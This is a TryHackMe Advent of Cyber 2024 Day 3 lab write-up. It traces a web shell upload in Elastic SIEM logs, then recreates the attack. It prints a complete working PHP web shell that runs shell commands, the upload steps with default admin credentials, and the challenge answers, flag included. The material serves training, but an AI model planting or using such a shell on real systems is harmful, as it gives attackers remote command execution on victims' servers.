# 🎄 TryHackMe Advent of Cyber 2024: Day 3: Log Analysis

## Objectives 🎯

1. Investigate suspicious activity on Frosty Pines Resort’s web server using Elastic SIEM.
2. Identify how a web shell was uploaded and accessed.
3. Exploit the same vulnerability to recreate the attack and retrieve the hidden flag.

## Steps 🚀

### Step 1: Investigating the Logs (Blue Team)

#### Setting Up Elastic SIEM
1. Logged into **Kibana** at `http://MACHINE_IP:5601`.
2. Selected the **frostypines-resorts** index under the **Discover** tab.
3. Adjusted the timeframe to:
   ```
   October 1, 2024, 00:00: October 3, 2024, 20:00
   ```
4. Added relevant fields:
   - `requests`
   - `clientip`
5. Searched for `"shell.php"` in the `requests` field.

#### Findings
- **Where was the web shell uploaded to?**  
  **Answer:** `/media/images/rooms/shell.php`
- **What IP address accessed the web shell?**  
  **Answer:** `10.11.83.34`

### Step 2: Exploiting the RCE Vulnerability (Red Team)

#### Exploit Steps
1. **Edit Hosts File:**
   - Added `MACHINE_IP frostypines.thm` to `/etc/hosts`.
2. **Log In:**
   - Accessed `http://frostypines.thm` and logged in using:
     - **Username:** admin@frostypines.thm
     - **Password:** admin
3. **Prepare Web Shell:**
   - Created `shell.php` with the following code:
     ```
     <html>
     <body>
     <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
     <input type="text" name="command" autofocus id="command" size="50">
     <input type="submit" value="Execute">
     </form>
     <pre>
     <?php
         if(isset($_GET['command'])) 
         {
             system($_GET['command'] . ' 2>&1'); 
         }
     ?>
     </pre>
     </body>
     </html>
     ```
4. **Upload the Web Shell:**
   - Uploaded `shell.php` as the room image under “Add Room.”
5. **Locate the Shell:**
   - Confirmed the upload at:  
     `http://frostypines.thm/media/images/rooms/shell.php`
6. **Retrieve the Flag:**
   - Accessed the shell and executed:
     ```
     cat flag.txt
     ```

#### Result
- **What is the content of the flag.txt?**  
  **Answer:** `THM{Gl1tch_Was_H3r3}`

## Key Findings 🔑

1. **Upload Location:** The web shell was uploaded to `/media/images/rooms/shell.php`.
2. **Access Point:** The attacker’s IP was `10.11.83.34`.
3. **Exploit Success:** By recreating the attack, I retrieved the flag using the web shell.

## Lessons Learned 🌟

### Blue Team Insights
1. **Log Analysis Matters:** Elastic SIEM made it efficient to trace the attacker’s actions and pinpoint suspicious activity.
2. **Correlate Data:** Adding context with fields like `requests` and `clientip` accelerated the investigation.
3. **Monitoring Uploads:** Unvalidated file uploads are a significant security gap.

### Red Team Insights
1. **Web Shell Simplicity:** A basic PHP script can compromise a system, emphasizing the importance of validating uploaded files.
2. **Default Credentials Are Dangerous:** The admin account used weak credentials (`admin/admin`), making it an easy target.
3. **Defense Against Exploits:** Proper input validation and access controls could have mitigated this attack.

### Tools and Techniques 🛠️

1. **[Elastic SIEM](https://www.elastic.co/security/siem):** Used to investigate web server logs and identify attacker activity.  
2. **Text Editor:** Created the PHP web shell to exploit the vulnerability.  
3. **Browser:** Navigated and interacted with the Frosty Pines Resort website during the attack.  

## Final Thoughts 🎁

Day 3 highlighted the importance of both offensive and defensive skills in cybersecurity. Investigating the logs with Elastic SIEM provided clear insights into the attack, while exploiting the vulnerability demonstrated how impactful simple security oversights can be. Excited to tackle Day 4!

### Answers ✅
1. **Where was the web shell uploaded to?**  
   **Answer:** `/media/images/rooms/shell.php`
2. **What IP address accessed the web shell?**  
   **Answer:** `10.11.83.34`
3. **What is the content of the flag.txt?**  
   **Answer:** `THM{Gl1tch_Was_H3r3}`

## Table of Contents 📚

| Day  | Challenge                              | Day  | Challenge                               | Day  | Challenge                               |
|------|----------------------------------------|------|-----------------------------------------|------|-----------------------------------------|
| 📖  | [README](../README.md)                 | 9    | [Risk Assessment](days/day9.md)         | 17   | [Log Analysis](days/day_17.md)          |
| 1    | [OPSEC Challenge](days/day1.md)        | 10   | [Phishing](days/day_10.md)              | 18   | [Prompt Injection](days/day_18.md)      |
| 2    | [Log Analysis](days/day2.md)           | 11   | [Wi-Fi Attacks](days/day_11.md)         | 19   | [Game Hacking](days/day_19.md)          |
| 3    | **Log Analysis**                       | 12   | [Web Timing Attacks](days/day_12.md)    | 20   | [Traffic Analysis](days/day_20.md)      |
| 4    | [Atomic Red Team](days/day4.md)        | 13   | [WebSockets](days/day_13.md)            | 21   | [Reverse Engineering](days/day_21.md)   |
| 5    | [XXE](days/day5.md)                    | 14   | [Certificate Mismanagement](days/day_14.md)| 22 | [Kubernetes DFIR](days/day_22.md)       |
| 6    | [Sandboxes](days/day6.md)              | 15   | [Active Directory](days/day_15.md)      | 23   | [Hash Cracking](days/day_23.md)         |
| 7    | [AWS Sandboxes](days/day7.md)          | 16   | [Azure Exploitation](days/day_16.md)    | 24   | [Communication Protocols](days/day_24.md)|
| 8    | [Shellcodes](days/day8.md)             |      | **Merry SOC-mas!** 🎁✨☃️              |      | 🎄✨🎅                                |
